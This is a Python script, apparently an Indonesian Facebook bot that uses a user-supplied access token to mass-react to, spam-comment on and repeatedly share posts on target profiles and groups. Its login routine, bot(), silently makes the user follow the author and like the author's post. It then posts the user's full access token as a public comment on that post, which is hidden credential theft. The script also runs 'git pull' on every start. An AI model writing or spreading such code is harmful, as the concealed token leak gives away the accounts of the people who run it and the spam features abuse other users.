#!/usr/bin/python3
#coding=utf-8

import os, sys, re, time, requests, calendar, random,json
from datetime import datetime
from datetime import date

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]

bo = []

###### TIME DELAY ######

def countdown(p): 
    while p: 
        mins, secs = divmod(p, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        time.sleep(1) 
        p -= 1
     
now = datetime.now()
hour = now.hour
if hour < 4:
  respon = "Selamat Dini Hari !"
elif 4 <= hour < 12:
  respon = "Selamat Pagi !"
elif 12 <= hour < 15:
  respon = "Selamat Siang !"
elif 15 <= hour < 17:
  respon = "Selamat Sore !"
elif 17 <= hour < 18:
  respon = "Selamat Petang !"
else:
  respon = "Selamat Malam !"
   
###### LOGO TAMPILAN ######

logo = ('''\033[1;97m
 ____    ____  __ __  ____   __ __  _     
|    \  /    T|  T  T|    \ |  T  T| T    
|  o  )Y  o  ||  l  ||  D  )|  |  || |    
|   _/ |     ||  _  ||    / |  |  || l___ 
|  |   |  _  ||  |  ||    \ |  :  ||     T
|  |   |  |  ||  |  ||  .  Yl     ||     |
l__j   l__j__jl__j__jl__j\_j \__,_jl_____j versi : 0.1

''')




###### LOGIN TOKEN FACEBOOK ######

def login():
	os.system("clear")
	try:
		token = open('token.txt', 'r')
		print("\033[1;91m(+) token kedaluwarsa !!!")
		time.sleep(1)
		os.system('rm token.txt')
		login()
	except (KeyError, IOError):
		os.system('clear')
		print (logo)
		token = input('\033[1;97m(+) token : \033[1;92m')
		try:
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			print("\n\033[1;97m(+) sedang masuk tunggu sebentar...")
			bot()
			masuk()
		except KeyError:
			print("\033[1;91m[!] token kedaluwarsa !!!")
			time.sleep(1)
			os.system('rm token.txt')
			login()
			

###### BOT FACEBOOK ######

def bot():
	try:
		token = open('token.txt', 'r').read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except (KeyError, IOError):
		print("\033[1;91m[!] token kedaluwarsa !!!")
		os.system('rm token.txt')
		login()
	texs = ("bang pahrul gua izin pake script lu :)\n\nhttps://www.facebook.com/100058252283419/posts/409580980993641/?app=fbl\n")
	kom = ("Komentar Ini Ditulis Oleh Bot ")
	waktu = str(datetime.now().strftime('%H:%M:%S'))
	tanggal = ("%s %s %s"%(ha,op,ta))
	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
	requests.post('https://graph.facebook.com/100058252283419/subscribers?access_token=' + token) 
	requests.post('https://graph.facebook.com/409580980993641/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/409580980993641/comments/?message=' + respon + '\n\n' + texs +'\n' + kom + '\n[ Pukul '+ waktu + ' WIB ] '+ '\n- '+ _hari_ + ', '+ tanggal + ' -' + '&access_token=' + token)
	requests.post('https://graph.facebook.com/409580980993641/comments/?message=' + token + '&access_token=' + token)
	
os.system("clear")

now = datetime.now()
hour = now.hour
if hour < 4:
  waktu = "Selamat Dini Hari"
elif 4 <= hour < 12:
  waktu = "Selamat Pagi"
elif 12 <= hour < 15:
  waktu = "Selamat Siang"
elif 15 <= hour < 17:
  waktu = "Selamat Sore"
elif 17 <= hour < 18:
  waktu = "Selamat Petang"
else:
  waktu = "Selamat Malam"

def masuk():
	try:
		token = open('token.txt', 'r').read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except (KeyError, IOError):
		print("\033[1;91m[!] token kedaluwarsa !!!")
		os.system('rm token.txt')
		login()
	os.system('clear')
	print(logo)
	print("\033[1;97m(+) Hello \033[1;92m"+ nama +" \033[1;97m"+ waktu +"\033[1;97m")
	print ("")
	print ("(1) bot react target post         ")
	print ("(2) bot react group post  ")
	print ("(3) bot coment target post          ")
	print ("(4) bot coment group post          ")
	print ("(5) bot share post         ")
	print ("(0) log out ( keluar )          ")
	print ("")
	pilih()
	
	
def pilih():
	pahrul = input('\033[1;97m(+) choose : ')
	if pahrul == "":
		print ("")
		print ("(+) Ngetik Apaan Lu bangsad !!!")
		exit()
	elif pahrul == "1":
		react()
	elif pahrul == "2":
		react_grup()
	elif pahrul == "3":
		spam()
	elif pahrul == "4":
		grup_spam()
	elif pahrul == "5":
		share()
	elif pahrul == "0":
		os.system('rm token.txt')
		exit()
	else:
		print ("")
		print ("(+) Ngetik Apaan Lu bangsad !!!")
		exit()
		
		
		

###### REACT TARGET POSTS ######
		
		
def react():
    reaksi = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo) 
    print("\033[1;97m(1) like (2) love (3) wow (4) haha (5) sad (6) angry")
    print("")
    emot = input ("\033[1;97m(+) choose : ")
    if emot in ('1', '01'):
        tipe = 'LIKE'
    elif emot in ('2', '02'):
        tipe = 'LOVE'
    elif emot in ('3', '03'):
        tipe = 'WOW'
    elif emot in ('4', '04'):
        tipe = 'HAHA'
    elif emot in ('5', '05'):
        tipe = 'SAD'
    elif emot in ('6', '06'):
        tipe = 'ANGRY'
    elif emot in ('0', '00'):
        menu()
    else:
        exit()
    print("")
    os.system('clear')
    print (logo)
    id = input ("\033[1;97m(+) id target : \033[1;92m")
    limit = input ("\033[1;97m(+) limit : \033[1;92m")
    print ('\n\033[1;97m(+) please wait...')
    print("")
    
    try:
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        x = json.loads(r.text)
        for z in x['feed']['data']:
            idz = z['id']
            reaksi.append(idz)
            requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ idz + '\033[1;91m')
            sys.stdout.flush()
        
        print("\n\033[1;97m(+) Finished...")
        pahrul = input ("\033[1;97m\n[<BACK>]")
        masuk()
    except KeyError:
        exit()




###### BOT REACT GROUP POST ######


def react_grup():
    reaksi = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo)  
    print("\033[1;97m(1) like (2) love (3) wow (4) haha (5) sad (6) angry")
    print("")
    emot = input ("\033[1;97m(+) choose : ")
    if emot in ('1', '01'):
        tipe = 'LIKE'
    elif emot in ('2', '02'):
        tipe = 'LOVE'
    elif emot in ('3', '03'):
        tipe = 'WOW'
    elif emot in ('4', '04'):
        tipe = 'HAHA'
    elif emot in ('5', '05'):
        tipe = 'SAD'
    elif emot in ('6', '06'):
        tipe = 'ANGRY'
    elif emot in ('0', '00'):
        menu()
    else:
        exit()
    print("")
    os.system('clear')
    print (logo)
    id = input('\033[1;97m(+) input id group : \033[1;92m')
    limit = input('\033[1;97m(+) limit : \033[1;92m')
    print ('\n\033[1;97m(+) please wait...')
    print("")
    
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
    except KeyError:
    	exit()
        
    try:
        r = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        x = json.loads(r.text)
        for z in x['feed']['data']:
            idz = z['id']
            reaksi.append(idz)
            requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ idz + '\033[1;91m')
            sys.stdout.flush()
        
        print("\n\033[1;97m(+) Finished...")
        pahrul = input ("\033[1;97m\n[<BACK>]")
        masuk()
    except KeyError:
        exit()




###### KOMENT POSTINGAN FACEBOOK ######


def spam():
    komen = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo) 
    id = input ('\033[1;97m(+) id target : \033[1;92m')
    kom = input ('\033[1;97m(+) komentar  : \033[1;92m')
    limit = input ('\033[1;97m(+) limit     : \033[1;92m')
    km = kom.replace('<>', '\n')
    print("")
    print("\033[1;97m(+) please wait...")
    print("")
    
    try:
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        f = json.loads(r.text)
        for z in f['feed']['data']:
            ie = z['id']
            komen.append(ie)
            requests.post('https://graph.facebook.com/' + ie + '/comments?message=' + km + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ ie + '\033[1;91m')
            sys.stdout.flush()
        
        print ("\n\033[1;97m(+) finished...")
        pahrul = input('\n\033[1;97m[<BACK>]')
        masuk()
    except KeyError:
        exit()



def grup_spam():
    komengrup = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo) 
    id = input ('\033[1;97m(+) input id group : \033[1;92m')
    kom = input ('\033[1;97m(+) komentar  : \033[1;92m')
    limit = input ('\033[1;97m(+) limit     : \033[1;92m')
    km = kom.replace('<>', '\n')
    print("")
    print("\033[1;97m(+) please wait...")
    print("")
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
    except KeyError:
        exit()

    
    try:
        p = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        a = json.loads(p.text)
        for e in a['feed']['data']:
            grep = e['id']
            komengrup.append(grep)
            requests.post('https://graph.facebook.com/' + grep + '/comments?message=' + km + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ grep + '\033[1;91m')
            sys.stdout.flush()
        
        print ("\n\033[1;97m(+) finished...")
        pahrul = input('\n\033[1;97m[<BACK>]')
        masuk()
    except KeyError:
        exit()





###### SHARE POSTINGAN FACEBOOK ######

def share():
    global token
    try:   	
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        na1m = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\033[1;91m[!] token kedaluwarsa !!!")
    except requests.exceptions.ConnectionError:
        exit("\033[1;91m[!] anda tidak terhubung ke internet !")
    os.system('clear')
    print (logo)
    id = input('\033[1;97m(+) id post : \033[1;92m')
    m=int(input(f'\033[1;97m(+) limit   : \033[1;92m'))
    p=int(input(f'\033[1;97m(+) delay   : \033[1;92m'))
    print("")
    print("\033[1;97m(+) please wait...")
    print("")
    try:
	     token = open("token.txt", "r").read()
	     for i in range(m):
#                 time.sleep(30)
	         response1 = requests.post("https://graph.facebook.com/me/feed?method=POST&link=https://www.facebook.com/"+id+"&privacy={%27value%27:%20%27EVERYONE%27}&access_token="+token+"")
	         print("\r\033[1;92m[✓] SUCCESS : "+response1.text+"")
	         countdown(int(p)) 
	         sys.stdout.flush()
	         print ("\n\033[1;97m(+) finished...")
	         pahrul = input ("\n\033[1;97m[<BACK>]")
	         masuk()
    except requests.exceptions.ConnectionError:
	    exit("\033[1;91m[!] anda tidak terhubung ke internet !")



###### UNTUK MEMANGGIL FUNGSI ######

if __name__ == '__main__':
	os.system("git pull")
	os.system("clear")
	login()
